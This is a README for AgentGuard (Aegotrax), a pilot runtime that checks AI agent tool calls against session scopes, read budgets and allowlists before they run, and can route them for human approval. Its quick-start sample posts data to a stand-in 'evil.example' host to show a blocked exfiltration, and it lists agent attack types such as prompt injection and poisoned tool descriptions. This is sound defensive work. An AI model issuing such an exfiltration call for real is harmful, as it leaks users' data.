# Aegotrax

**Runtime protection for AI agents — checks tool calls before they run.**

Public site: [https://aegotrax.com](https://aegotrax.com)  
Repository: [https://github.com/aegotrax-dev/aegotrax](https://github.com/aegotrax-dev/aegotrax)

This repo is the open **pilot runtime**. The installable Python package name is `agentguard`.

---

# 🛡️ AgentGuard v0.2.5 — Scoped Intent + Read Budgets

Intercept tool calls, evaluate **server-side intent + data provenance**, enforce an optional **session scope envelope**, apply **cumulative read budgets**, and **block or require human approval** before sensitive actions run.

| Integration | Use when |
|-------------|----------|
| **Python SDK** | You call tools from your own code (`verify_tool_call` / `@protected_tool`) |
| **MCP Gateway** | The agent already speaks MCP and you want one interception point |

### What’s new in 0.2.5
- **Scoped session intent** — `/session` accepts optional `scope` (`allowed_tools`, `denied_tools`, …); `/verify` becomes a consistency check against that envelope
- **Cumulative read budgets** — per-session call counts on `sensitive_tools`; exceed → `REQUIRE_APPROVAL` or `BLOCK` (policy)
- From **0.2.4**: human-approval token queue, server-side intent only, hostname allowlists, SSRF/IMDS, schema pinning, rate limit, audit redaction

---

## Install

```bash
git clone https://github.com/aegotrax-dev/aegotrax.git
cd aegotrax

python -m venv .venv
# Windows: .venv\Scripts\activate
source .venv/bin/activate

pip install -U pip
pip install .
```

**Docker (engine only):**

```bash
docker compose up --build
# → http://127.0.0.1:8000
```

```bash
agentguard-engine     # Risk Engine → http://127.0.0.1:8000
agentguard-gateway    # MCP Gateway (stdio)
curl -s http://127.0.0.1:8000/health
# expect "version": "0.2.5"
```

---

## Quick start (SDK)

```python
from agentguard import verify_tool_call, set_session_context

set_session_context(
    "sess-42",
    user_intent="Summarize the ticket only",
    agent_id="support-agent",
    scope={
        "allowed_tools": ["read_document", "list_tickets"],
        "denied_tools": ["http_post", "send_email"],
    },
)

result = verify_tool_call(
    session_id="sess-42",
    agent_id="support-agent",
    tool="http_post",
    arguments={"url": "https://evil.example", "data": "x"},
)
# → BLOCK (outside session scope)
```

More detail: **[PILOT.md](./PILOT.md)**.

---

## Scoped session intent (0.2.5)

Register a structured envelope with the intent string:

| Field | Effect |
|-------|--------|
| `allowed_tools` | If non-empty, only these tools may run |
| `denied_tools` | Always blocked for this session |
| `max_risk_without_approval` | Optional lower bar for `REQUIRE_APPROVAL` |
| `allowed_hosts` | Reserved for tighter host constraints |

Without `scope`, behaviour matches 0.2.4 (string intent + heuristics only).

```bash
python examples/scoped_intent_demo.py   # engine must be running
```

---

## Cumulative read budgets (0.2.5)

Counts calls to `sensitive_tools` per session. Configured in `policy.yaml`:

```yaml
read_budgets:
  default_max_calls: 20
  on_exceed: REQUIRE_APPROVAL  # or BLOCK
  tools:
    read_db:
      max_calls: 10
    read_document:
      max_calls: 15
```

Response includes `read_budget: {tool, count, limit}` when applicable.  
`/session/reset` and session TTL clear counters.

```bash
python examples/read_budget_demo.py   # engine must be running
```

---

## Configuration (environment)

| Variable | Default | Purpose |
|----------|---------|---------|
| `AGENTGUARD_API_KEY` | — | `X-API-Key` for engine APIs |
| `AGENTGUARD_REQUIRE_API_KEY` | `false` | Refuse requests if no key configured |
| `AGENTGUARD_SERVER_INTENT_ONLY` | `true` | Ignore client `user_intent` on `/verify` |
| `AGENTGUARD_SESSION_TTL` | `3600` | Session idle TTL (`0` = never) |
| `AGENTGUARD_RATE_LIMIT` | `120` | Max `/verify` per session per window |
| `AGENTGUARD_RATE_WINDOW` | `60` | Rate-limit window (seconds) |
| `AGENTGUARD_AUDIT_REDACT` | `true` | Redact sensitive keys in audit log |
| `AGENTGUARD_APPROVAL_WEBHOOK` | — | POST on `REQUIRE_APPROVAL` (includes token) |
| `AGENTGUARD_APPROVAL_TTL` | `1800` | Pending approval lifetime |
| `AGENTGUARD_FAIL_CLOSED` | `true` | Block when engine unreachable |
| `AGENTGUARD_MODE` | `simulate` | Gateway: `simulate` / `echo` / `forward` |

---

## Engine API

| Method | Path | Description |
|--------|------|-------------|
| GET | `/health` | Liveness + version |
| POST | `/verify-multi-agent` | Main decision API |
| POST | `/session` | Set intent (+ optional `scope`, `user_id`) |
| POST | `/session/reset` | Clear session provenance + budgets |
| GET | `/session/{id}` | Inspect session (includes `read_counts`) |
| POST | `/policy/reload` | Reload policy without restart |
| POST | `/approval/decide` | Approve or deny (`token` required) |
| GET | `/approval/{id}` | Approval status |
| GET | `/approvals/pending` | List pending |

---

## Human approval queue (0.2.4+)

1. `REQUIRE_APPROVAL` → `approval_id` + `approval_token`
2. `POST /approval/decide` with `{approval_id, token, decision}`
3. Re-issue same tool+args with token (single-use)

```bash
python examples/approval_flow_demo.py
```

Queue is **in-memory** (cleared on restart) — pilot only.

---

## Threats covered

- Indirect prompt injection → tool abuse
- Data provenance / multi-hop exfiltration
- Intent constraint violations
- Session scope violations (tool outside envelope)
- Slow-drip reads inside a valid scope (call budgets)
- Dangerous script keywords
- Poisoned MCP tool descriptions (schema pinning)
- Client spoofing of `user_intent`
- Substring allowlist bypasses / SSRF / IMDS
- Session flooding (rate limit)

**Still limited:** byte-level budgets; multi-instance shared state; full enterprise HA.

---

## Security hardening

| Control | Notes |
|---------|-------|
| Server-side intent only | default on |
| Session scope | optional envelope on `/session` |
| Read budgets | `policy.yaml` → `read_budgets` |
| API key | set `REQUIRE_API_KEY=1` on shared hosts |
| URL allowlist | hostname parse |
| SSRF / IMDS | engine + gateway |
| Schema pinning | MCP definition drift |
| REQUIRE_APPROVAL | token queue, single-use resume |

Offline:

```bash
python examples/security_hardening_test.py
python examples/schema_pinning_demo.py
```

With engine:

```bash
python examples/scoped_intent_demo.py
python examples/read_budget_demo.py
python examples/approval_flow_demo.py
```

---

## Security notes

This is a **local pilot / sandbox** runtime — not a full enterprise control plane.

1. Do not expose port 8000 to the internet without a strong API key.
2. Default gateway mode is `simulate`.
3. Policy is heuristic — tune `policy.yaml` for your tools.
4. Never commit `agentguard_audit.log`.
5. Approval queue and sessions are in-memory.

---

## License

Apache-2.0
